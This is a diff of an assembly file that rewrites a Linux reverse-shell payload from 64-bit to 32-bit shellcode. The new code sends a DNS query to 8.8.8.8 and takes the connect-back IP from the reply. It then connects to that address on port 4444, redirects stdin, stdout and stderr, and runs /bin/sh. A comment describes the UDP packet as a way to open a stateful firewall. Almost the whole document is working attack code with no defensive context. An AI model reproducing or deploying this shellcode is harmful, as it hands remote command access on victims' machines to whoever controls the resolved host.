@@ -73,6 +73,12 @@ global      main   ;must be declared for linker (ld)
    ; 00 01 - QTYPE 
    ; 00 01 - QCLASS
 
+
+
+
+
+
+
    ; DNS ANSWER!
    ; aa aa
    ; 81 80
@@ -104,104 +110,192 @@ global      main   ;must be declared for linker (ld)
 
 
 
-main:
-
-        mov rax, 41                                ;Create Socket
-        mov rdi, 2                                 ;AF_INET
-        mov rsi, 2                                 ;Sock_DGRAM
-        mov rdx, 0                                 ;flags
-        syscall                                    ;CALL SYSCALL CREATE SOCKET ; Looks good!
-
-        mov rdi, rax                            ; sockfd
-; ####################### DNS REQUEST
-
-            mov rax, 0x0000000000000000
-push rax 
-mov rax, 0x01000100006d6f63
-push rax 
-mov rax, 0x0376656474696b74
-push rax 
-mov rax, 0x6f6f720a00000000
-push rax 
-mov rax, 0x000001000001AAAA
-push rax 
-
-; ############################### 
-
-        mov rsi ,rsp
-        mov rdx, 32 ; len of bytes    ; Google IP  port 53  INET Family       
-        mov rax, 0x0101010135000002   ; 8.8.8.8.8 - 0x35 - 00 00 02 
-        push rax
-        mov rax, 44                             ; Send Syscall
-      
-        mov r8, rsp
-        mov r9, 16
-        syscall
+main:                                         
+    ; we create a socket fd, using again syscall 0x66 and argument SYS_SOCKET so ebx = 1  
+    push   0x66
+    pop    eax
+    push   0x1 
+    pop    ebx
+    xor    ecx,ecx
+    push   ecx
+    ; but this times it will be a SOCK_DGRAM UDP, so 0x2 as argument 
+    push   0x2  
+    push   0x2 
+    mov    ecx,esp
+    int    0x80 ; SYS_SOCKET
+    ; saving fd on the stack ; In reality I think I will save the port here instead 
+    push eax
 
 
-; Now need to read the response!
+    push 0x08080808 ; 8.8.8.8 ; I love that this doesn't really need to be backwards.
+    ;push 0x0100007F            ; 0100007F 1.0.0.127 for testing...
 
-        xor rax, rax   ; read syscall == 0x00
-        push 100        ; Set out bytes to response to be higher!
-        pop rdx         ; rdx = input size
-        sub rsp, rdx
-        mov rsi, rsp    ; rsi => buffer
-        syscall
-
-        add rsp, rax ; This will give us the top of the stack where the answer is stored.
-        sub rsp, 0x4 ;
-        mov rax, [rsp]
-        mov ebx, eax 
-        mov rax, rbx
+    xor edx,edx
+    mov dh, 0x35  ; port 53; comment this for variable port 
+    push dx       ; comment this for variable port 
+                  ; push word PORT ; UNcomment this for variable port 
+    push word 0x2 ; 
 
 
 
 
-    ; Set up for TCP Session    
+    mov ecx,esp   ; save pointer to ecx 
+    push 0x10     ; addrlen 
+    push ecx      ; pointer to sockaddr 
+    push eax      ; fd received previously 
+    mov ecx,esp   ;  
+    mov esi,eax   ; save fd for next call 
+    xor eax,eax 
+    mov al,0x66  
+    add bl,0x2   ; BL  = 3 SYS_CONNECT
+    int 0x80      ;CALL  SYS_CONNECT
 
-;         ;7F 00 00 01
-        mov rax,  0xbf6d24b0
-        ;mov rax, 0x0100007F                   ; UNCOMENT FOR TESTING! ; Push IP 127.0.0.1
-        push rax                                ; Push our saved IP!
-        push word 0x5c11                        ; Port (4444)
-        push word 2                             ; Address family -
+
+    ; now we send a UDP packet to open stateful firewall :] 
+    xor eax,eax
+    mov al,0x66   
+
+    ; push 0x00000001 ; Origional Working Example        
+    ; push 0x00010000
+    ; push 0x6d6f6303
+    ; push 0x656c706d
+    ; push 0x61786507  ; sizeof (MyDomain) 72 6f 6f 74 6b 69 74 64 65 76 Now we move this in backwards
+    ; push 0x00000000
+    ; push 0x00000100
+    ; push 0x0001AAAA
+
+      push 0x00000001
+  push 0x00010000
+  push 0x6d6f6303
+  push 0x656c706d
+  push 0x61786507
+  push 0x00000000
+  push 0x00000100
+  push 0x0001AAAA
 
 
-        push 42                                 ; connect syscall
-        push byte 16                            ; length
-        push byte 41                            ; socket syscall
-        push byte 1                             ; type - SOCK_STREAM (0x1)
-        push byte 2                             ; family - AF_INET (0x2)
 
-        pop rdi                                 ; family
-        pop rsi                                 ; type
-        xor rdx, rdx                            ; protocol
-        pop rax                                 ; socket syscall
-        syscall
 
-        mov rdi, rax                            ; sockfd
-        pop rdx                                 ; length
-        pop rax                                 ; connect syscall
-        mov rsi, rsp                            ; sockaddr
-        syscall
+    mov edx,esp ; Move the string to EDX so we can send it. 
+    xor ecx,ecx
+    push ecx  
+    push 64 ; size of message to be sent is 8
+    push edx 
+    push esi 
+    mov ecx,esp
+    xor ebx,ebx 
+    mov bl,0x9 
+    int 0x80     ;CALL SYS_SEND
 
-        xor rsi, rsi
-loop:
-        mov al, 33
-        syscall
-        inc rsi
-        cmp rsi, 2
-        jle loop
+   ; cd ; Change Directional flag. I am not sure if it's needed yet.
 
-        xor rax, rax
-        mov rdi, 0x68732f6e69622f2f
-        xor rsi, rsi
-        push rsi
-        push rdi
-        mov rdi, rsp
-        xor rdx, rdx
-        mov al, 59
-        syscall
+    mov eax,  3 ; Prepare for SYSCALL_READ
+    mov ebx,  3 ; 
+    mov ecx, esp
+    mov edx, 100
+    int 0x80   ;CALL SYSCALL_READ
+    
+    add esp, eax
+    sub esp, 4 
+    mov eax ,[esp]
+    ;bswap eax
+    push eax ; Probably not needed, I just want to ensure it's saved. 
+    mov ebp, eax
+
+ ;###################################
+ ;
+ ;     SET UP FOR REVERSE SHELL!!!
+ ;
+ ;###################################
+
+;
+	; int socketcall(int call, unsigned long *args);
+	; sockfd = socket(int socket_family, int socket_type, int protocol);
+	;
+	push 0x66 
+	pop eax ;syscall: sys_socketcall + cleanup eax
+
+	push 0x1
+	pop ebx ;sys_socket (0x1) + cleanup ebx
+
+	xor edx,edx ;cleanup edx
+
+	push edx ;protocol=IPPROTO_IP (0x0)	
+	push ebx ;socket_type=SOCK_STREAM (0x1)
+	push 0x2 ;socket_family=AF_INET (0x2)
+
+	mov ecx, esp ;save pointer to socket() args
+
+	int 0x80 ;exec sys_socket
+
+	xchg edx, eax; save result (sockfd) for later usage
+
+	;
+	; int socketcall(int call, unsigned long *args);
+	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+	;
+	mov al, 0x66
+
+    ;
+    ;mov ebp , 0x0100007f  ;sin_addr=127.1.1.1 (network byte order)
+    push ebp ; Pushing our saved IP.
+	 
+	push word 0x5c11  ;0x5c11 ;sin_port=4444 (network byte order)
+	inc ebx          
+	push word bx     ;sin_family=AF_INET (0x2)
+	mov ecx, esp     ;save pointer to sockaddr struct
+
+	push 0x10 ;addrlen=16
+	push ecx  ;pointer to sockaddr
+	push edx  ;sockfd
+
+	mov ecx, esp ;save pointer to sockaddr_in struct
+
+	inc ebx ; sys_connect (0x3)
+
+	int 0x80 ;exec sys_connect 
+
+	;
+	; int socketcall(int call, unsigned long *args);
+	; int dup2(int oldfd, int newfd);
+	;
+	push 0x2
+	pop ecx  ;set loop-counter
+
+	xchg ebx,edx ;save sockfd
+
+; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
+;loop:
+	;mov al, 0x3f ;syscall: sys_dup2 
+	;int 0x80     ;exec sys_dup2
+	;dec ecx	     ;decrement loop-counter
+	;jns loop     ;as long as SF is not set -> jmp to loop
+
+;NoLOOPS
+    mov al, 0x3f ;syscall: sys_dup2 
+	int 0x80     ;exec sys_dup2
+	dec ecx	     ;decrement loop-counter
+    mov al, 0x3f ;syscall: sys_dup2 
+	int 0x80     ;exec sys_dup2
+	dec ecx	     ;decrement loop-counter
+    mov al, 0x3f ;syscall: sys_dup2 
+	int 0x80     ;exec sys_dup2
+    dec ecx	 
+
+	; int execve(const char *filename, char *const argv[],char *const envp[]);
+	;
+	mov al, 0x0b ; syscall: sys_execve
+
+	inc ecx      ;argv=0
+	mov edx,ecx  ;envp=0
+
+	push edx        ;terminating NULL
+	push 0x68732f2f	;"hs//"
+	push 0x6e69622f	;"nib/"
+
+	mov ebx, esp ;save pointer to filename
+
+	int 0x80 ; exec sys_execve
 
 
 
